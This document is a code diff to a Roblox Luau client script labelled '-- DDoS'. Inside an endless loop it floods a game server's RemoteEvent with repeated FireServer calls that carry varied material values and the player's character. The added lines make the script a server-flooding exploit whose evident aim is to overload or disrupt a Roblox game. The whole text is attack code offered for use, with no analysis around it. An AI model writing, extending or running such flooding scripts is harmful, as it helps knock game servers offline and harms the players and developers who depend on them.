@@ -1,3 +1,5 @@
+-- DDoS
+
 local Players: Players = game:GetService("Players");
 local Player: Player = Players.LocalPlayer;
 local Character: Character = Player.Character;
@@ -15,11 +17,20 @@ while true do
 
     for i = 1, count do
         RemoteEvent:FireServer(Enum.Material.Concrete, Character);
+        RemoteEvent:FireServer(Enum.Material.DiamondPlate, Character);
+        RemoteEvent:FireServer(Enum.Material.Air, Character);
+        RemoteEvent:FireServer(Enum.Material.Metal, Character);
+        RemoteEvent:FireServer(Enum.Material.SmoothPlastic, Character);
+        RemoteEvent:FireServer(Enum.Material.Rock, Character);
+        RemoteEvent:FireServer(Enum.Material.Grass, Character);
+        RemoteEvent:FireServer(Enum.Material.Sand, Character);
         RemoteEvent:FireServer(Enum.Material.Concrete, Character);
-        RemoteEvent:FireServer(Enum.Material.Concrete, Character);
-        RemoteEvent:FireServer(Enum.Material.Concrete, Character);
-        RemoteEvent:FireServer(Enum.Material.Concrete, Character);
-        RemoteEvent:FireServer(Enum.Material.Concrete, Character);
-        RemoteEvent:FireServer(Enum.Material.Concrete, Character);
+        RemoteEvent:FireServer(Enum.Material.DiamondPlate, Character);
+        RemoteEvent:FireServer(Enum.Material.Air, Character);
+        RemoteEvent:FireServer(Enum.Material.Metal, Character);
+        RemoteEvent:FireServer(Enum.Material.SmoothPlastic, Character);
+        RemoteEvent:FireServer(Enum.Material.Rock, Character);
+        RemoteEvent:FireServer(Enum.Material.Grass, Character);
+        RemoteEvent:FireServer(Enum.Material.Sand, Character);
     end;
 end;
